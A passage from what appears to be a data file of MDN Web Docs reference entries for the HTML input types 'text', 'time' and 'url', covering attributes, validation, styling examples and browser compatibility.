absolute;\n  content: \"✓\";\n  padding-left: 5px;\n}\n```\n\nThe technique also requires a [`<span>`](../span) element to be placed after the form element, which acts as a holder for the icons. This was necessary because some input types on some browsers don't display icons placed directly after them very well.\n\n### Making input required\n\nYou can use the [`required`](../input#required) attribute as an easy way of making entering a value required before form submission is allowed:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"uname\">Choose a username: </label>\n    <input type=\"text\" id=\"uname\" name=\"name\" required />\n    <span class=\"validity\"></span>\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nThis renders like so:\n\nIf you try to submit the form with no search term entered into it, the browser will show an error message.\n\n### Input value length\n\nYou can specify a minimum length (in characters) for the entered value using the [`minlength`](../input#minlength) attribute; similarly, use [`maxlength`](../input#maxlength) to set the maximum length of the entered value, in characters.\n\nThe example below requires that the entered value be 4–8 characters in length.\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"uname\">Choose a username: </label>\n    <input\n      type=\"text\"\n      id=\"uname\"\n      name=\"name\"\n      required\n      size=\"10\"\n      placeholder=\"Username\"\n      minlength=\"4\"\n      maxlength=\"8\" />\n    <span class=\"validity\"></span>\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nThis renders like so:\n\nIf you try to submit the form with less than 4 characters, you'll be given an appropriate error message (which differs between browsers). If you try to enter more than 8 characters, the browser won't let you.\n\n**Note:** If you specify a `minlength` but do not specify `required`, the input is considered valid, since the user is not required to specify a value.\n\n### Specifying a pattern\n\nYou can use the [`pattern`](../input#pattern) attribute to specify a regular expression that the inputted value must match in order to be considered valid (see [Validating against a regular expression](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation#validating_against_a_regular_expression) for a simple crash course on using regular expressions to validate inputs).\n\nThe example below restricts the value to 4-8 characters and requires that it contain only lower-case letters.\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"uname\">Choose a username: </label>\n    <input\n      type=\"text\"\n      id=\"uname\"\n      name=\"name\"\n      required\n      size=\"45\"\n      pattern=\"[a-z]{4,8}\" />\n    <span class=\"validity\"></span>\n    <p>Usernames must be lowercase and 4-8 characters in length.</p>\n  </div>\n  <div>\n    <button>Submit</button>\n  </div>\n</form>\n```\n\nThis renders like so:\n\n## Examples\n\nYou can see good examples of text inputs used in context in our [Your first HTML form](https://developer.mozilla.org/en-US/docs/Learn/Forms/Your_first_form) and [How to structure an HTML form](https://developer.mozilla.org/en-US/docs/Learn/Forms/How_to_structure_a_web_form) articles.\n\n## Technical summary\n\n|                                 |                                                                                                                                                                                                                                                                                                              |                                                                                                                          |\n|---------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------|\n| **[Value](#value)**             | A string representing the text contained in the text field.                                                                                                                                                                                                                                                  |                                                                                                                          |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)                                                                                                                                    |                                                                                                                          |\n| **Supported Common Attributes** | [`autocomplete`](../input#autocomplete), [`list`](../input#list), [`maxlength`](../input#maxlength), [`minlength`](../input#minlength), [`pattern`](../input#pattern), [`placeholder`](../input#placeholder), [`readonly`](../input#readonly), [`required`](../input#required) and [`size`](../input#size)   |                                                                                                                          |\n| **IDL attributes**              | [`list`](../input#list), `value`                                                                                                                                                                                                                                                                             |                                                                                                                          |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                                                                      |                                                                                                                          |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select), [`setRangeText()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setRangeText) and [`setSelectionRange()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange). |                                                                                                                          |\n| **Implicit ARIA Role**          | with no `list` attribute: [`textbox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/textbox_role)                                                                                                                                                                                    | with `list` attribute: [`combobox`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/combobox_role) |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `text` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n## See also\n\n- [HTML Forms](https://developer.mozilla.org/en-US/docs/Learn/Forms)\n- [`<input>`](../input) and the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) interface it's based upon.\n- [`<input type=\"search\">`](search)\n- [`<textarea>`](../textarea): Multi-line text input\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/text](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/text)"
- name: input type="time"
  summary: <input> elements of type time create input fields designed to let the user easily enter a time (hours and minutes, and optionally seconds)
  description: "# \\<input type=\"time\"\\>\n\n[`<input>`](../input) elements of type `time` create input fields designed to let the user easily enter a time (hours and minutes, and optionally seconds).\n\nWhile the control's user interface appearance is based on the browser and operating system, the features are the same. The value is always a 24-hour `hh:mm` or `hh:mm:ss` formatted time, with leading zeros, regardless of the UI's input format.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"time\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <label for=\"appt\">Choose a time for your meeting:</label>\n\n    <input type=\"time\" id=\"appt\" name=\"appt\" min=\"09:00\" max=\"18:00\" required />\n\n    <small>Office hours are 9am to 6pm</small>\n\n    label {\n      display: block;\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input,\n    label {\n      margin: 0.4rem 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n### Setting the value attribute\n\nYou can set a default value for the input by including a valid time in the [`value`](../input#value) attribute when creating the `<input>` element, like so:\n\nhtml\n\n```\n<label for=\"appt-time\">Choose an appointment time: </label>\n<input id=\"appt-time\" type=\"time\" name=\"appt-time\" value=\"13:30\" />\n```\n\n### Setting the value using JavaScript\n\nYou can also get and set the time value in JavaScript using the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) `value` property, for example:\n\njs\n\n```\nconst timeControl = document.querySelector('input[type=\"time\"]');\ntimeControl.value = \"15:30\";\n```\n\n### Time value format\n\nThe `value` of the `time` input is always in 24-hour format that includes leading zeros: `hh:mm`, regardless of the input format, which is likely to be selected based on the user's locale (or by the user agent). If the time includes seconds (see [Using the step attribute](#using_the_step_attribute)), the format is always `hh:mm:ss`. You can learn more about the format of the time value used by this input type in [Time strings](../../date_and_time_formats#time_strings).\n\nIn this example, you can see the time input's value by entering a time and seeing how it changes afterward.\n\nFirst, a look at the HTML. This is simple enough, with the label and input as we've seen before, but with the addition of a [`<p>`](../p) element with a [`<span>`](../span) to display the value of the `time` input:\n\nhtml\n\n```\n<form>\n  <label for=\"startTime\">Start time: </label>\n  <input type=\"time\" id=\"startTime\" />\n  <p>\n    Value of the <code>time</code> input:\n    <code>\"<span id=\"value\">n/a</span>\"</code>.\n  </p>\n</form>\n```\n\nThe JavaScript code adds code to the time input to watch for the [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event) event, which is triggered every time the contents of an input element change. When this happens, the contents of the `<span>` are replaced with the new value of the input element.\n\njs\n\n```\nconst startTime = document.getElementById(\"startTime\");\nconst valueSpan = document.getElementById(\"value\");\n\nstartTime.addEventListener(\n  \"input\",\n  () => {\n    valueSpan.innerText = startTime.value;\n  },\n  false,\n);\n```\n\nWhen a form including a `time` input is submitted, the value is encoded before being included in the form's data. The form's data entry for a time input will always be in the form `name=hh%3Amm`, or `name=hh%3Amm%3Ass` if seconds are included (see [Using the step attribute](#using_the_step_attribute)).\n\n## Additional attributes\n\nIn addition to the attributes common to all [`<input>`](../input) elements, `time` inputs offer the following attributes.\n\n**Note:** Unlike many data types, time values have a **periodic domain**, meaning that the values reach the highest possible value, then wrap back around to the beginning again. For example, specifying a `min` of `14:00` and a `max` of `2:00` means that the permitted time values start at 2:00 PM, run through midnight to the next day, ending at 2:00 AM. See more in the [making min and max cross midnight](#making_min_and_max_cross_midnight) section of this article.\n\n### list\n\nThe values of the list attribute is the [`id`](https://developer.mozilla.org/en-US/docs/Web/API/Element/id) of a [`<datalist>`](../datalist) element located in the same document. The [`<datalist>`](../datalist) provides a list of predefined values to suggest to the user for this input. Any values in the list that are not compatible with the [`type`](../input#type) are not included in the suggested options. The values provided are suggestions, not requirements: users can select from this predefined list or provide a different value.\n\n### max\n\nA string indicating the latest time to accept, specified in the same [time value format](#time_value_format) as described above. If the specified string isn't a valid time, no maximum value is set.\n\n### min\n\nA string specifying the earliest time to accept, given in the [time value format](#time_value_format) described previously. If the value specified isn't a valid time string, no minimum value is set.\n\n### readonly\n\nA Boolean attribute which, if present, means this field cannot be edited by the user. Its `value` can, however, still be changed by JavaScript code directly setting the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) `value` property.\n\n**Note:** Because a read-only field cannot have a value, `required` does not have any effect on inputs with the `readonly` attribute also specified.\n\n### step\n\nThe `step` attribute is a number that specifies the granularity that the value must adhere to, or the special value `any`, which is described below. Only values which are equal to the basis for stepping ([`min`](#min) if specified, [`value`](../input#value) otherwise, and an appropriate default value if neither of those is provided) are valid.\n\nA string value of `any` means that no stepping is implied, and any value is allowed (barring other constraints, such as [`min`](#min) and [`max`](#max)).\n\n**Note:** When the data entered by the user doesn't adhere to the stepping configuration, the [user agent](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) may round to the nearest valid value, preferring numbers in the positive direction when there are two equally close options.\n\nFor `time` inputs, the value of `step` is given in seconds, with a scaling factor of 1000 (since the underlying numeric value is in milliseconds). The default value of `step` is 60, indicating 60 seconds (or 1 minute, or 60,000 milliseconds).\n\nWhen `any` is set as the value for `step`, the default 60 seconds is used, and the seconds value is not displayed in the UI.\n\n## Using time inputs\n\n### Basic uses of time\n\nThe simplest use of `<input type=\"time\">` involves a basic `<input>` and [`<label>`](../label) element combination, as seen below:\n\nhtml\n\n```\n<form>\n  <label for=\"appt-time\">Choose an appointment time: </label>\n  <input id=\"appt-time\" type=\"time\" name=\"appt-time\" />\n</form>\n```\n\n### Controlling input size\n\n`<input type=\"time\">` doesn't support form sizing attributes such as [`size`](../input#size), since times are always about the same number of characters long. You'll have to resort to [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) for sizing needs.\n\n### Using the step attribute\n\nYou can use the [`step`](../input#step) attribute to vary the amount of time jumped whenever the time is incremented or decremented (for example, so the time moves by 10 minutes at a time when clicking the little arrow widgets).\n\nIt takes an integer value defining the number of seconds you want to increment by; the default value is 60 seconds. With this as the default, most user agent time UIs display hours and minutes but not seconds. Including the [`step`](../input#step) attribute with any numeric value other than a value divisible by `60` adds seconds to the UI, if the `min` or `max` value has not already caused the seconds to be visible.\n\nhtml\n\n```\n<form>\n  <label for=\"appt-time\">Choose an appointment time: </label>\n  <input id=\"appt-time\" type=\"time\" name=\"appt-time\" step=\"2\" />\n</form>\n```\n\nTo specify minutes or hours as a step, specify the number of minutes or hours in seconds, such as 120 for 2 minutes, or 7200 for 2 hours.\n\n## Validation\n\nBy default, `<input type=\"time\">` does not apply any validation to entered values, other than the user agent's interface generally not allowing you to enter anything other than a time value. This is helpful, but you can't entirely rely on the value to be a proper time string, since it might be an empty string (`\"\"`), which is allowed.\n\n### Setting maximum and minimum times\n\nYou can use the [`min`](../input#min) and [`max`](../input#max) attributes to restrict the valid times that can be chosen by the user. In the following example we are setting a minimum time of `12:00` and a maximum time of `18:00`:\n\nhtml\n\n```\n<form>\n  <label for=\"appt-time\">\n    Choose an appointment time (opening hours 12:00 to 18:00):\n  </label>\n  <input id=\"appt-time\" type=\"time\" name=\"appt-time\" min=\"12:00\" max=\"18:00\" />\n  <span class=\"validity\"></span>\n</form>\n```\n\nHere's the CSS used in the above example. Here we make use of the [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) CSS properties to style the input based on whether the current value is valid. We add an icon as generated content icon on a [`<span>`](../span) next to the input.\n\ncss\n\n```\ndiv {\n  margin-bottom: 10px;\n  position: relative;\n}\n\ninput[type=\"number\"] {\n  width: 100px;\n}\n\ninput + span {\n  padding-right: 30px;\n}\n\ninput:invalid + span::after {\n  position: absolute;\n  content: \"✖\";\n  padding-left: 5px;\n}\n\ninput:valid + span::after {\n  position: absolute;\n  content: \"✓\";\n  padding-left: 5px;\n}\n```\n\nThe result here is that:\n\n- Only times between 12:00 and 18:00 will be seen as valid; times outside that range will be denoted as invalid.\n\n#### Making min and max cross midnight\n\nBy setting a [`min`](../input#min) attribute greater than the [`max`](../input#max) attribute, the valid time range will wrap around midnight to produce a valid time range. This functionality is not supported by any other input types.\n\njs\n\n```\nconst input = document.createElement(\"input\");\ninput.type = \"time\";\ninput.min = \"23:00\";\ninput.max = \"01:00\";\ninput.value = \"23:59\";\n\nif (input.validity.valid && input.type === \"time\") {\n  // <input type=time> reversed range supported\n} else {\n  // <input type=time> reversed range unsupported\n}\n```\n\n### Making times required\n\nIn addition, you can use the [`required`](../input#required) attribute to make filling in the time mandatory. Browsers will display an error if you try to submit a time that is outside the set bounds, or an empty time field.\n\nLet's look at an example; here we've set minimum and maximum times, and also made the field required:\n\nhtml\n\n```\n<form>\n  <div>\n    <label for=\"appt-time\">\n      Choose an appointment time (opening hours 12:00 to 18:00):\n    </label>\n    <input\n      id=\"appt-time\"\n      type=\"time\"\n      name=\"appt-time\"\n      min=\"12:00\"\n      max=\"18:00\"\n      required />\n    <span class=\"validity\"></span>\n  </div>\n  <div>\n    <input type=\"submit\" value=\"Submit form\" />\n  </div>\n</form>\n```\n\nIf you try to submit the form with an incomplete time (or with a time outside the set bounds), the browser displays an error. Try playing with the example now:\n\n**Warning:** HTML form validation is *not* a substitute for scripts that ensure that the entered data is in the proper format. It's far too easy for someone to make adjustments to the HTML that allow them to bypass the validation, or to remove it entirely. It's also possible for someone to bypass your HTML entirely and submit the data directly to your server. If your server-side code fails to validate the data it receives, disaster could strike when improperly-formatted data is submitted (or data which is too large, of the wrong type, and so forth).\n\n## Examples\n\nIn this example, we create an interface element for choosing time using the native picker created with `<input type=\"time\">`:\n\n### HTML\n\nhtml\n\n```\n<form>\n  <label for=\"appt-time\">\n    Choose an appointment time (opening hours 12:00 to 18:00):\n  </label>\n  <input\n    id=\"appt-time\"\n    type=\"time\"\n    name=\"appt-time\"\n    min=\"12:00\"\n    max=\"18:00\"\n    required />\n  <span class=\"validity\"></span\n```\n\n### CSS\n\ncss\n\n```\ninput[type=\"number\"] {\n  width: 100px;\n}\n\ninput + span {\n  padding-right: 30px;\n}\n\ninput:invalid + span::after {\n  position: absolute;\n  content: \"✖\";\n  padding-left: 5px;\n}\n\ninput:valid + span::after {\n  position: absolute;\n  content: \"✓\";\n  padding-left: 5px;\n}\n```\n\n### Result\n\n## Technical Summary\n\n|                                 |                                                                                                                                                                                                                                                                                 |\n|---------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **[Value](../input#value)**     | A string representing a time, or empty.                                                                                                                                                                                                                                         |\n| **Events**                      | [`change`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/change_event) and [`input`](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)                                                                                                       |\n| **Supported common attributes** | [`autocomplete`](../input#autocomplete), [`list`](../input#list), [`readonly`](../input#readonly), [`step`](../input#step)                                                                                                                                                      |\n| **IDL attributes**              | [`list`](../input#list), [`value`](../input#value), `valueAsDate`, `valueAsNumber`                                                                                                                                                                                              |\n| **DOM interface**               | [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)                                                                                                                                                                                         |\n| **Methods**                     | [`select()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/select), [`stepDown()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepDown), and [`stepUp()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/stepUp). |\n| **Implicit ARIA Role**          | [no corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                                             |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `time` | 20      | 12   | 57      | 10    | 14.1   | 25             | 57                  | 10.1          | 5             | 1.5              | 4.4             |     |\n\n## See also\n\n- [`<input type=\"date\">`](date)\n- [`<input type=\"datetime-local\">`](datetime-local)\n- [`<input type=\"week\">`](week)\n- [`<input type=\"month\">`](month)\n- The generic [`<input>`](../input) element and the interface used to manipulate it, [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement)\n- [Date and time formats used in HTML](../../date_and_time_formats)\n- [Date and Time picker tutorial](https://developer.mozilla.org/en-US/docs/Learn/Forms/HTML5_input_types#date_and_time_pickers)\n- [Compatibility of CSS properties](https://developer.mozilla.org/en-US/docs/Learn/Forms/Property_compatibility_table_for_form_controls)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/time](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/time)"
- name: input type="url"
  summary: <input> elements of type url are used to let the user enter and edit a URL
  description: "# \\<input type=\"url\"\\>\n\n[`<input>`](../input) elements of type `url` are used to let the user enter and edit a URL.\n\n## Try it\n\n#### HTML Demo: \\<input type=\"url\"\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <form>\n      <label for=\"url\">Enter an https:// URL:</label>\n      <input type=\"url\" name=\"url\" id=\"url\" placeholder=\"https://example.com\" pattern=\"https://.*\" size=\"30\" required />\n    </form>\n\n    label {\n      display: block;\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    input,\n    label {\n      margin: 0.4rem 0;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nThe input value is automatically validated to ensure that it's either empty or a properly-formatted URL before the form can be submitted. The [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) CSS pseudo-classes are automatically applied as appropriate to visually denote whether the current value of the field is a valid URL or not.\n\n## Value\n\nThe [`<input>`](../input) element's [`value`](../input#value) attribute contains a string that is automatically validated as conforming to URL syntax. More specifically, there are two possible value formats that will pass validation:\n\n1.  An empty string (\"\") indicates the user did not enter a value or that the value was removed.\n2.  A single properly-formed absolute URL. This doesn't necessarily mean the URL address exists, but it is at least formatted correctly. An entry matching `urlscheme://restofurl` can be valid, even if the `urlscheme` entered doesn't exist.\n\nSee [Validation](#validation) for details on how URLs are validated to ensure that they're formatted properly.\n\n## Additional attributes\n\nIn addition to the attributes that operate on all [`<input>`](../input) elements regardless of their type, `url` inputs support the following attributes.\n\n### list\n\nThe values of the list attribute is the [`id`](https://developer.mozilla.org/en-US/docs/Web/API/Element/id) of a [`<datalist>`](../datalist) element located in the same document. The [`<datalist>`](../datalist) provides a list of predefined values to suggest to the user for this input. Any values in the list that are not compatible with the [`type`](../input#type) are not included in the suggested options. The values provided are suggestions, not requirements: users can select from this predefined list or provide a different value.\n\n### maxlength\n\nThe maximum string length (measured in UTF-16 code units) that the user can enter into the `url` input. This must be an integer value of `0` or higher. If no `maxlength` is specified, or an invalid value is specified, the `url` input has no maximum length. This value must also be greater than or equal to the value of `minlength`.\n\nThe input will fail [constraint validation](../../constraint_validation) if the length of the text value of the field is greater than `maxlength` UTF-16 code units long. Constraint validation is only applied when the value is changed by the user.\n\n### minlength\n\nThe minimum string length (measured in UTF-16 code units) that the user can enter into the `url` input. This must be a non-negative integer value smaller than or equal to the value specified by `maxlength`. If no `minlength` is specified, or an invalid value is specified, the `url` input has no minimum length.\n\nThe input will fail [constraint validation](../../constraint_validation) if the length of the text entered into the field is fewer than `minlength` UTF-16 code units long. Constraint validation is only applied when the value is changed by the user.\n\n### pattern\n\nThe `pattern` attribute, when specified, is a regular expression that the input's [`value`](../input#value) must match for the value to pass [constraint validation](../../constraint_validation). It must be a valid JavaScript regular expression, as used by the [`RegExp`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp) type, and as documented in our [guide on regular expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions); the `'u'` flag is specified when compiling the regular expression so that the pattern is treated as a sequence of Unicode code points, instead of as [ASCII](https://developer.mozilla.org/en-US/docs/Glossary/ASCII). No forward slashes should be specified around the pattern text.\n\nIf the specified pattern is not specified or is invalid, no regular expression is applied and this attribute is ignored completely.\n\n**Note:** Use the [`title`](../input#title) attribute to specify text that most browsers will display as a tooltip to explain what the requirements are to match the pattern. You should also include other explanatory text nearby.\n\nSee the section [Pattern validation](#pattern_validation) for details and an example.\n\n### placeholder\n\nThe `placeholder` attribute is a string that provides a brief hint to the user as to what kind of information is expected in the field. It should be a word or short phrase that demonstrates the expected type of data, rather than an explanatory message. The text *must not* include carriage returns or line feeds.\n\nIf the control's content has one directionality ([LTR](https://developer.mozilla.org/en-US/docs/Glossary/LTR) or [RTL](https://developer.mozilla.org/en-US/docs/Glossary/RTL)) but needs to present the placeholder in the opposite directionality, you can use Unicode bidirectional algorithm formatting characters to override directionality within the placeholder; see [How to use Unicode controls for bidi text](https://www.w3.org/International/questions/qa-bidi-unicode-controls) for more information.\n\n**Note:** Avoid using the `placeholder` attribute if you can. It is not as semantically useful as other ways to explain your form, and can cause unexpected technical issues with your content. See [`<input>` labels](../input#labels) for more information.\n\n### readonly\n\nThe [`readonly`](../../attributes/readonly) Boolean attribute, if present, means this field cannot be edited by the user. Its `value` can, however, still be changed by JavaScript code directly setting the [`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement) `value` property.\n\n**Note:** Because a read-only field cannot have a value, [`required`](../../attributes/required) does not have any effect on inputs with the `readonly` attribute also specified.\n\n### size\n\nThe `size` attribute is a numeric value indicating how many characters wide the input field should be. The value must be a number greater than zero, and the default value is 20. Since character widths vary, this may or may not be exact and should not be relied upon to be so; the resulting input may be narrower or wider than the specified number of characters, depending on the characters and the font ([`font`](https://developer.mozilla.org/en-US/docs/Web/CSS/font) settings in use).\n\nThis does *not* set a limit on how many characters the user can enter into the field. It only specifies approximately how many can be seen at a time. To set an upper limit on the length of the input data, use the [`maxlength`](#maxlength) attribute.\n\n### spellcheck\n\nThe [`spellcheck`](../../global_attributes/spellcheck) global attribute is used to indicate whether to enable spell-checking for an element. It can be used on any editable content, but here we consider specifics related to the use of `spellcheck` on [`<input>`](../input) elements. The permitted values for `spellcheck` are:\n\n[`false`](#false)  \nDisable spell-checking for this element.\n\n[`true`](#true)  \nEnable spell-checking for this element.\n\n[\"\" (empty string) or no value](#_empty_string_or_no_value)  \nFollow the element's default behavior for spell-checking. This may be based upon a parent's `spellcheck` setting or other factors.\n\nAn input field can have spell-checking enabled if it doesn't have the [readonly](#readonly) attribute set and is not disabled.\n\nThe value returned by reading `spellcheck` may not reflect the actual state of spell-checking within a control if the [user agent's](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) preferences override the setting.\n\n## Non-standard attributes\n\nThe following non-standard attributes are also available on some browsers. As a general rule, you should avoid using them unless it can't be helped.\n\n### autocorrect\n\nA Safari extension, the `autocorrect` attribute is a string that indicates whether to activate automatic correction while the user is editing this field. Permitted values are:\n\n[`on`](#on)  \nEnable automatic correction of typos, as well as processing of text substitutions if any are configured.\n\n[`off`](#off)  \nDisable automatic correction and text substitutions.\n\n## Using URL inputs\n\nWhen you create a URL input with the proper `type` value, `url`, you get automatic validation that the entered text is at least in the correct form to potentially be a legitimate URL. This can help avoid cases in which the user mistypes their website's address, or provides an invalid one.\n\nIt's important, however, to note that this is not enough to ensure that the specified text is a URL which actually exists, corresponds to the user of the site, or is acceptable in any other way. It ensures that the value of the field is properly formatted to be a URL.\n\n**Note:** A user can tinker with your HTML behind the scenes, so your site *must not* use this validation for any security purposes. You *must* verify the URL on the server-side of any transaction in which the provided text may have any security implications of any kind.\n\n### A simple URL input\n\nThis element is implemented as a standard text input field with basic validation features. In its most basic form, a URL input can be implemented like this:\n\nhtml\n\n```\n<input id=\"myURL\" name=\"myURL\" type=\"url\" />\n```\n\nNotice that it's considered valid when empty and when a single validly-formatted URL address is entered, but is otherwise not considered valid. By adding the [`required`](../input#required) attribute, only properly-formed URLs are allowed; the input is no longer considered valid when empty.\n\nThere is nothing magical going on here. Submitting this form would cause the following data to be sent to the server: `myURL=http%3A%2F%2Fwww.example.com`. Note how characters are escaped as necessary.\n\n### Placeholders\n\nSometimes it's helpful to offer an in-context hint as to what form the input data should take. This can be especially important if the page design doesn't offer descriptive labels for each [`<input>`](../input). This is where **placeholders** come in. A placeholder is a value that demonstrates the form the `value` should take by presenting an example of a valid value, which is displayed inside the edit box when the element's `value` is \"\". Once data is entered into the box, the placeholder disappears; if the box is emptied, the placeholder reappears.\n\nHere, we have a `url` input with the placeholder `http://www.example.com`. Note how the placeholder disappears and reappears as you manipulate the contents of the edit field.\n\nhtml\n\n```\n<input\n  id=\"myURL\"\n  name=\"myURL\"\n  type=\"url\"\n  placeholder=\"http://www.example.com\" />\n```\n\n### Controlling the input size\n\nYou can control both the physical length of the input box and the minimum and maximum lengths allowed for the input text.\n\n#### Physical input element size\n\nThe physical size of the input box can be controlled using the [`size`](../input#size) attribute. With it, you can specify the number of characters the input box can display at a time. In this example, for instance, the `url` edit box is 30 characters wide:\n\nhtml\n\n```\n<input id=\"myURL\" name=\"myURL\" type=\"url\" size=\"30\" />\n```\n\n#### Element value length\n\nThe `size` is separate from the length limitation on the entered URL itself. You can specify a minimum length, in characters, for the entered URL using the [`minlength`](../input#minlength) attribute; similarly, use [`maxlength`](../input#maxlength) to set the maximum length of the entered URL. If `maxLength` exceeds `size`, the input box's contents will scroll as needed to show the current selection or insertion point as the content is manipulated.\n\nThe example below creates a 30-character wide URL address entry box, requiring that the contents be no shorter than 10 characters and no longer than 80 characters.\n\nhtml\n\n```\n<input\n  id=\"myURL\"\n  name=\"myURL\"\n  type=\"url\"\n  size=\"30\"\n  minlength=\"10\"\n  maxlength=\"80\" />\n```\n\n**Note:** These attributes also affect validation; a value shorter or longer than the specified minimum/maximum lengths will be classified as invalid; in addition most browsers will refuse to let the user enter a value longer than the specified maximum length.\n\n### Providing default options\n\n#### Providing a single default using the value attribute\n\nAs always, you can provide a default value for a `url` input box by setting its [`value`](../input#value) attribute:\n\nhtml\n\n```\n<input id=\"myURL\" name=\"myURL\" type=\"url\" value=\"http://www.example.com\" />\n```\n\n#### Offering suggested values\n\nTaking it a step further, you can provide a list of default options from which the user can select by specifying the [`list`](../input#list) attribute. This doesn't limit the user to those options, but does allow them to select commonly-used URLs more quickly. This also offers hints to [`autocomplete`](../input#autocomplete). The `list` attribute specifies the ID of a [`<datalist>`](../datalist), which in turn contains one [`<option>`](../option) element per suggested value; each `option`'s `value` is the corresponding suggested value for the URL entry box.\n\nhtml\n\n```\n<input id=\"myURL\" name=\"myURL\" type=\"url\" list=\"defaultURLs\" />\n\n<datalist id=\"defaultURLs\">\n  <option value=\"https://developer.mozilla.org/\"></option>\n  <option value=\"http://www.google.com/\"></option>\n  <option value=\"http://www.microsoft.com/\"></option>\n  <option value=\"https://www.mozilla.org/\"></option>\n  <option value=\"http://w3.org/\"></option>\n</datalist>\n```\n\nWith the [`<datalist>`](../datalist) element and its [`<option>`](../option)s in place, the browser will offer the specified values as potential values for the URL; this is typically presented as a popup or drop-down menu containing the suggestions. While the specific user experience may vary from one browser to another, typically clicking in the edit box presents a drop-down of the suggested URLs. Then, as the user types, the list is adjusted to show only matching values. Each typed character narrows down the list until the user makes a selection or types a custom value.\n\n#### Using labels for suggested values\n\nYou can opt to include the [`label`](../option#label) attribute on one or all of your `<option>` elements to provide textual labels. Some browsers may display only the labels, while others may display both the label and the URL.\n\nhtml\n\n```\n<input id=\"myURL\" name=\"myURL\" type=\"url\" list=\"defaultURLs\" />\n\n<datalist id=\"defaultURLs\">\n  <option value=\"https://developer.mozilla.org/\" label=\"MDN Web Docs\"></option>\n  <option value=\"http://www.google.com/\" label=\"Google\"></option>\n  <option value=\"http://www.microsoft.com/\" label=\"Microsoft\"></option>\n  <option 